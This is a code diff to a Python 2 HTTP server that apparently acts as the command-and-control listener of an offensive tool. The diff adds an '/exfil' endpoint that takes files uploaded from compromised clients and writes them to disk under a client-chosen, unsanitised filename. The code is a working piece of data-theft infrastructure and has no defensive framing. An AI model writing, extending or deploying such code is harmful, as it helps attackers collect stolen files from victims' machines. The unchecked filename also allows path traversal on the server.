@@ -4,6 +4,8 @@ from lib.banner import *
 from lib.functions import *
 import argparse
 import BaseHTTPServer
+import os
+import cgi
 
 parser = argparse.ArgumentParser()
 parser.add_argument("ip", help="The IP address to listen on.")
@@ -26,6 +28,22 @@ class CmdHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 		s.wfile.write(cmd)
 
 	def do_POST(s):
+
+		if s.path == '/exfil':
+			try:
+				content_type, pdict = cgi.parse_header(s.headers.getheader('content-type'))
+				if content_type == 'multipart/form-data':
+					fs = cgi.FieldStorage( fp = s.rfile, headers=s.headers, environ={'REQUEST_METHOD':'POST'})
+				else:
+					print_error("Unexpected POST request")
+				fs_up = fs['file']
+				with open(fs.getvalue("filename") + '.exfil', 'wb') as o:
+					o.write(fs_up.file.read())
+					s.send_response(200)
+					s.end_headers()
+			except Exception,e:
+				print_error(str(e))
+			return
 
 		s.send_response(200)
 		s.end_headers()
